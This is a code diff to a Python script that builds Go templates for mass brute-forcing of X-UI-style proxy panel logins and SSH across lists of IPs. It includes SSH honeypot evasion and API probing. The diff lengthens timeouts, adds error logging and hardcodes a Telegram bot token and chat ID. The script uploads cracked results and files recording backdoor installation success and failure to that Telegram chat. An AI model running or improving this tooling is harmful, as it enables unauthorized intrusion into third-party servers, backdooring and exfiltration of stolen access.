@@ -9,7 +9,7 @@ try:
 except ImportError:
     pass
 
-# =========================== xui.go模板1内容 (已修复v4 - 移除未使用变量) ===========================
+# =========================== xui.go模板1内容 (已修复v4 - 增加网络错误日志) ===========================
 XUI_GO_TEMPLATE_1 = '''package main
 
 import (
@@ -33,7 +33,7 @@ var totalTasks int64
 var startTime time.Time
 
 var httpClient = &http.Client{
-	Timeout: 3 * time.Second,
+	Timeout: 10 * time.Second,
 }
 
 func loadList(filename string) []string {
@@ -87,19 +87,25 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 
 	for _, username := range usernames {
 		for _, password := range passwords {
-			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+			var err error
+			var resp *http.Response
+			
+			// 尝试 HTTP
+			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 			url := fmt.Sprintf("http://%s:%s/login", ip, port)
-			resp, err := postRequest(ctx, url, username, password)
+			resp, err = postRequest(ctx, url, username, password)
 			cancel()
 
+			// 如果 HTTP 失败, 尝试 HTTPS
 			if err != nil {
-				ctx, cancel = context.WithTimeout(context.Background(), 2*time.Second)
+				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
 				url = fmt.Sprintf("https://%s:%s/login", ip, port)
-				resp, err = postRequest(ctx, url, username, password)
-				cancel()
+				resp, err = postRequest(ctx2, url, username, password)
+				cancel2()
 			}
 
 			if err != nil {
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
@@ -194,7 +200,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板2内容 (已修复v4 - 移除未使用变量) ===========================
+# =========================== xui.go模板2内容 (已修复v4 - 增加网络错误日志) ===========================
 XUI_GO_TEMPLATE_2 = '''package main
 
 import (
@@ -218,7 +224,7 @@ var totalTasks int64
 var startTime time.Time
 
 var httpClient = &http.Client{
-	Timeout: 3 * time.Second,
+	Timeout: 10 * time.Second,
 }
 
 func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
@@ -258,19 +264,23 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 
 	for _, username := range usernames {
 		for _, password := range passwords {
-			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+			var err error
+			var resp *http.Response
+
+			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 			url := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
-			resp, err := postRequest(ctx, url, username, password)
+			resp, err = postRequest(ctx, url, username, password)
 			cancel()
 
 			if err != nil {
-				ctx, cancel = context.WithTimeout(context.Background(), 2*time.Second)
+				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
 				url = fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
-				resp, err = postRequest(ctx, url, username, password)
-				cancel()
+				resp, err = postRequest(ctx2, url, username, password)
+				cancel2()
 			}
 
 			if err != nil {
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			defer resp.Body.Close()
@@ -379,7 +389,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板3内容 (已修复v4 - 移除未使用变量) ===========================
+# =========================== xui.go模板3内容 (已修复v4 - 增加网络错误日志) ===========================
 XUI_GO_TEMPLATE_3 = '''package main
 
 import (
@@ -403,7 +413,7 @@ var totalTasks int64
 var startTime time.Time
 
 var httpClient = &http.Client{
-	Timeout: 3 * time.Second,
+	Timeout: 10 * time.Second,
 }
 
 func loadList(filename string) []string {
@@ -462,11 +472,12 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 
 	for _, username := range usernames {
 		for _, password := range passwords {
-			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 			url := fmt.Sprintf("http://%s:%s/hui/auth/login", ip, port)
 			resp, err := postRequest(ctx, url, username, password)
 			cancel()
 			if err != nil {
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			defer resp.Body.Close()
@@ -560,7 +571,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板4内容 (已修复v4 - 移除未使用变量) ===========================
+# =========================== xui.go模板4内容 (已修复v4 - 增加网络错误日志) ===========================
 XUI_GO_TEMPLATE_4 = '''package main
 
 import (
@@ -584,7 +595,7 @@ var totalTasks int64
 var startTime time.Time
 
 var httpClient = &http.Client{
-	Timeout: 3 * time.Second,
+	Timeout: 10 * time.Second,
 }
 
 func loadList(filename string) []string {
@@ -647,11 +658,12 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 
 	for _, username := range usernames {
 		for _, password := range passwords {
-			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
+			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 			resp, err := postRequest(ctx, url, username, password)
 			cancel()
 
 			if err != nil {
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			defer resp.Body.Close()
@@ -747,7 +759,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板5内容 (已修复v4 - 移除未使用变量) ===========================
+# =========================== xui.go模板5内容 (已修复v4 - 增加网络错误日志) ===========================
 XUI_GO_TEMPLATE_5 = '''package main
 
 import (
@@ -771,7 +783,7 @@ var totalTasks int64
 var startTime time.Time
 
 var httpClient = &http.Client{
-	Timeout: 3 * time.Second,
+	Timeout: 10 * time.Second,
 }
 
 func loadList(filename string) []string {
@@ -832,11 +844,12 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 
 	for _, username := range usernames {
 		for _, password := range passwords {
-			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
+			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 			resp, err := postRequest(ctx, url, username, password)
 			cancel()
 
 			if err != nil {
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			defer resp.Body.Close()
@@ -930,7 +943,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板6内容 (已修复v4 - 移除未使用变量) ===========================
+# =========================== xui.go模板6内容 (已修复v4 - 增加网络错误日志) ===========================
 XUI_GO_TEMPLATE_6 = '''package main
 
 import (
@@ -970,19 +983,19 @@ func loadList(filename string) []string {
 	return result
 }
 
-func trySSH(ip, port, username, password string) (*ssh.Client, bool) {
+func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {
 	addr := fmt.Sprintf("%s:%s", ip, port)
 	config := &ssh.ClientConfig{
 		User:            username,
 		Auth:            []ssh.AuthMethod{ssh.Password(password)},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-		Timeout:         2 * time.Second,
+		Timeout:         10 * time.Second,
 	}
 	client, err := ssh.Dial("tcp", addr, config)
 	if err != nil {
-		return nil, false
+		return nil, false, err
 	}
-	return client, true
+	return client, true, nil
 }
 
 func isLikelyHoneypot(client *ssh.Client) bool {
@@ -1030,7 +1043,10 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 	found := false
 	for _, username := range usernames {
 		for _, password := range passwords {
-			client, success := trySSH(ip, port, username, password)
+			client, success, err := trySSH(ip, port, username, password)
+			if err != nil {
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+			}
 			if success {
 				defer client.Close()
 				fakePasswords := []string{
@@ -1042,7 +1058,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 				}
 				isHoneypot := false
 				for _, fake := range fakePasswords {
-					if fakeClient, fakeSuccess := trySSH(ip, port, username, fake); fakeSuccess {
+					if fakeClient, fakeSuccess, _ := trySSH(ip, port, username, fake); fakeSuccess {
 						fakeClient.Close()
 						isHoneypot = true
 						break
@@ -1337,7 +1353,7 @@ RETRY:
 
 
 '''
-# =========================== xui.go模板7内容 (已修复v4 - 移除未使用变量) ===========================
+# =========================== xui.go模板7内容 (已修复v4 - 增加网络错误日志) ===========================
 XUI_GO_TEMPLATE_7 = '''package main
 
 import (
@@ -1362,7 +1378,7 @@ var totalTasks int64
 var startTime time.Time
 
 const (
-	timeoutSeconds = 5
+	timeoutSeconds = 10
 	successFlag    = `{"status":"success","data"`
 )
 
@@ -1393,10 +1409,10 @@ func writeResultToFile(file *os.File, text string) {
 	file.WriteString(text + "\\n")
 }
 
-func sendRequest(ctx context.Context, client *http.Client, fullURL string) bool {
+func sendRequest(ctx context.Context, client *http.Client, fullURL string) (bool, error) {
 	req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
 	if err != nil {
-		return false
+		return false, err
 	}
 	for k, v := range headers {
 		req.Header.Set(k, v)
@@ -1404,17 +1420,17 @@ func sendRequest(ctx context.Context, client *http.Client, fullURL string) bool 
 
 	resp, err := client.Do(req)
 	if err != nil {
-		return false
+		return false, err
 	}
 	defer resp.Body.Close()
 
 	if resp.StatusCode == http.StatusOK {
 		bodyBytes, _ := io.ReadAll(resp.Body)
 		if strings.Contains(string(bodyBytes), successFlag) {
-			return true
+			return true, nil
 		}
 	}
-	return false
+	return false, nil
 }
 
 func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {
@@ -1425,7 +1441,11 @@ func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.
 
 	ctx1, cancel1 := context.WithTimeout(context.Background(), timeoutSeconds*time.Second)
 	defer cancel1()
-	if sendRequest(ctx1, client, httpProbeURL) {
+	success, err := sendRequest(ctx1, client, httpProbeURL)
+	if err != nil {
+		fmt.Printf("[-] 连接失败 %s - %v\\n", httpProbeURL, err)
+	}
+	if success {
 		output := fmt.Sprintf("http://%s?api=http://%s/%s", ipPort, ipPort, cleanPath)
 		writeResultToFile(file, output)
 		return true
@@ -1433,7 +1453,11 @@ func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.
 
 	ctx2, cancel2 := context.WithTimeout(context.Background(), timeoutSeconds*time.Second)
 	defer cancel2()
-	if sendRequest(ctx2, client, httpsProbeURL) {
+	success, err = sendRequest(ctx2, client, httpsProbeURL)
+	if err != nil {
+		fmt.Printf("[-] 连接失败 %s - %v\\n", httpsProbeURL, err)
+	}
+	if success {
 		output := fmt.Sprintf("https://%s?api=https://%s/%s", ipPort, ipPort, cleanPath)
 		writeResultToFile(file, output)
 		return true
@@ -1521,7 +1545,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板8内容 (已修复v4 - 移除未使用变量) ===========================
+# =========================== xui.go模板8内容 (已修复v4 - 增加网络错误日志) ===========================
 XUI_GO_TEMPLATE_8 = '''package main
 
 import (
@@ -1546,7 +1570,7 @@ var totalTasks int64
 var startTime time.Time
 
 var client = &http.Client{
-    Timeout: 3 * time.Second,
+    Timeout: 10 * time.Second,
     CheckRedirect: func(req *http.Request, via []*http.Request) error {
         return http.ErrUseLastResponse
     },
@@ -1646,6 +1670,7 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				resp, err := postRequest(ctx, finalURL, username, password, origin, referer)
 				cancel()
 				if err != nil {
+					fmt.Printf("[-] 连接失败 %s - %v\\n", finalURL, err)
 					continue
 				}
 				defer resp.Body.Close()
@@ -2133,6 +2158,16 @@ def check_environment():
     if platform.system().lower() == "windows":
         print(">>> 检测到 Windows 系统，跳过环境检测和依赖安装...\n")
         return
+
+    # Network Pre-flight Check
+    print(">>> 正在执行网络预检...")
+    try:
+        import socket
+        socket.create_connection(("www.google.com", 80), timeout=5)
+        print("✅ 网络预检成功：可以访问外部网络。")
+    except OSError:
+        print("❌ 网络预检失败：无法连接到外部网络。请检查VPS防火墙、安全组或路由配置。")
+        sys.exit(1)
     
     # Set GOCACHE to prevent "GOCACHE is not defined" error in restricted environments
     go_cache_dir = "/tmp/gocache"
@@ -2432,25 +2467,26 @@ if __name__ == "__main__":
                                 except Exception as e:
                                         print(f"❌ 发送到 TG 失败：{e}")
 
-                BOT_TOKEN = ""
-                CHAT_ID = ""
+                BOT_TOKEN = "7664203362:AAEWd52ZdliweeDvrV30MuwE2JcZQDWZIwQ"
+                CHAT_ID = "7697235358"
 
-                if final_result_file and os.path.exists(final_result_file):
-                        print(f"\n📤 正在将 {final_result_file} 上传至 Telegram ...")
-                        send_to_telegram(final_result_file, BOT_TOKEN, CHAT_ID)
+                if BOT_TOKEN and CHAT_ID:
+                    if final_result_file and os.path.exists(final_result_file):
+                            print(f"\n📤 正在将 {final_result_file} 上传至 Telegram ...")
+                            send_to_telegram(final_result_file, BOT_TOKEN, CHAT_ID)
 
-                        xlsx_file = final_result_file.replace(".txt", ".xlsx")
-                        if os.path.exists(xlsx_file):
-                                print(f"📤 正在将 {xlsx_file} 上传至 Telegram ...")
-                                send_to_telegram(xlsx_file, BOT_TOKEN, CHAT_ID)
-                        
-                        success_file = f"后门安装成功-{time_str}.txt"
-                        fail_file    = f"后门安装失败-{time_str}.txt"
+                            xlsx_file = final_result_file.replace(".txt", ".xlsx")
+                            if os.path.exists(xlsx_file):
+                                    print(f"📤 正在将 {xlsx_file} 上传至 Telegram ...")
+                                    send_to_telegram(xlsx_file, BOT_TOKEN, CHAT_ID)
+                            
+                            success_file = f"后门安装成功-{time_str}.txt"
+                            fail_file    = f"后门安装失败-{time_str}.txt"
 
-                        if os.path.exists(success_file):
-                                print(f"📤 正在将 {success_file} 上传至 Telegram ...")
-                                send_to_telegram(success_file, BOT_TOKEN, CHAT_ID)
+                            if os.path.exists(success_file):
+                                    print(f"📤 正在将 {success_file} 上传至 Telegram ...")
+                                    send_to_telegram(success_file, BOT_TOKEN, CHAT_ID)
 
-                        if os.path.exists(fail_file):
-                                print(f"📤 正在将 {fail_file} 上传至 Telegram ...")
-                                send_to_telegram(fail_file, BOT_TOKEN, CHAT_ID)
+                            if os.path.exists(fail_file):
+                                    print(f"📤 正在将 {fail_file} 上传至 Telegram ...")
+                                    send_to_telegram(fail_file, BOT_TOKEN, CHAT_ID)
